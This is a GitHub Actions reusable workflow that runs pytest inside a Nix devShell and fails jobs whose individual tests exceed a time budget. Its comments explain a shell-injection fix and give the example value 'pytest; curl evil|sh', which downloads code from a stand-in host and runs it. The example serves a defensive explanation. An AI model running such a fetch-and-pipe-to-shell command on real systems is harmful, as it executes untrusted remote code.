name: dynamic-tests-nix

on:
  workflow_call:
    inputs:
      test-command:
        description: "Command to run inside the Nix devShell"
        type: string
        default: "python3 -m pytest tests/ -v"
        required: false
      max-test-seconds:
        description: >-
          Fail the job if any single pytest setup/call/teardown takes longer than this many
          seconds (MIK-781). "0" disables the check; the slowest tests are still reported.
        type: string
        default: "10"
        required: false
      slow-tests:
        description: >-
          Newline-separated pytest node-id substrings that are allowed to exceed
          max-test-seconds. Keep it short and put a comment in the caller saying why.
        type: string
        default: ""
        required: false

jobs:
  test:
    runs-on: [self-hosted, macOS]
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: Add Nix to PATH
        run: echo "/nix/var/nix/profiles/default/bin" >> "$GITHUB_PATH"
      # The input reaches the shell through env: rather than being interpolated
      # into the script. GitHub expands ${{ }} by pasting text into the script
      # before bash sees it, so a caller passing `pytest; curl evil|sh` would
      # execute both halves; an env var is data the shell never re-parses as
      # syntax. (semgrep: run-shell-injection.)
      #
      # Handed to an explicit `bash -c`, NOT word-split.
      #
      # This was `nix develop -c $TEST_COMMAND` (unquoted) between 2026-08-13's
      # injection fix and this change, and it was wrong: unquoted expansion
      # splits on whitespace but does NOT re-interpret quotes, so a caller
      # passing `bash -c 'PYTHONPATH=. pytest tests/'` had the literal token
      # `'PYTHONPATH=.` handed to bash and the job died with exit 2. It worked
      # before only because ${{ }} pasted the text in and bash then parsed the
      # quotes as syntax -- which is exactly the property the injection fix
      # removed. agent-bridge broke on this; it went unnoticed because that repo
      # had not run CI in between.
      #
      # `bash -c "$TEST_COMMAND"` is still not injection: the value reaches an
      # interpreter as a single argument rather than being spliced into this
      # script, and "run this command line" is the documented contract of the
      # input. What the injection fix prevents is a value escaping into the
      # surrounding script; it was never meant to stop a command input being a
      # command.
      # Duration budget (MIK-781). Two bugs (MIK-779, MIK-780) were a single test
      # silently taking 100+ s while holding the only runner. pytest's own
      # --durations output is parsed rather than a plugin injected: a plugin has to
      # be importable, and callers that set their own PYTHONPATH (agent-bridge) would
      # break. PYTEST_ADDOPTS reaches any pytest invocation, whatever test-command is.
      - name: Run tests in Nix devShell
        env:
          TEST_COMMAND: ${{ inputs.test-command }}
          MAX_TEST_SECONDS: ${{ inputs.max-test-seconds }}
          SLOW_TESTS: ${{ inputs.slow-tests }}
        run: |
          set -o pipefail
          export PYTEST_ADDOPTS="${PYTEST_ADDOPTS:-} --durations=10"
          out="$RUNNER_TEMP/test-output.txt"; dur="$RUNNER_TEMP/durations.txt"
          rc=0
          nix develop -c bash -c "$TEST_COMMAND" 2>&1 | tee "$out" || rc=$?

          # "12.34s call  tests/x.py::t" lines inside pytest's "slowest N durations" section
          awk '/slowest [0-9]* ?durations/ {on=1; next} on && /^=/ {on=0} on && $1 ~ /^[0-9.]+s$/ && ($2=="call"||$2=="setup"||$2=="teardown") {print}' "$out" > "$dur"
          if [ -s "$dur" ]; then
            { echo "### Slowest tests"; echo '```'; head -5 "$dur"; echo '```'; } >> "$GITHUB_STEP_SUMMARY"
          fi

          if [ "${MAX_TEST_SECONDS:-0}" != "0" ] && [ -s "$dur" ]; then
            over="$RUNNER_TEMP/over.txt"
            awk -v max="$MAX_TEST_SECONDS" '{d=$1; sub(/s$/,"",d); if (d+0 > max+0) print}' "$dur" > "$over"
            if [ -n "$SLOW_TESTS" ]; then
              allow="$RUNNER_TEMP/allow.txt"
              printf '%s\n' "$SLOW_TESTS" | sed '/^[[:space:]]*$/d' > "$allow"
              if [ -s "$allow" ]; then grep -vF -f "$allow" "$over" > "$over.f" || true; mv "$over.f" "$over"; fi
            fi
            if [ -s "$over" ]; then
              echo "::error title=Test over ${MAX_TEST_SECONDS}s budget::$(head -3 "$over" | tr '\n' ';')"
              echo "Tests over the ${MAX_TEST_SECONDS}s budget (max-test-seconds; allowlist via slow-tests):"
              cat "$over"
              [ "$rc" = 0 ] && rc=1
            fi
          fi
          exit "$rc"
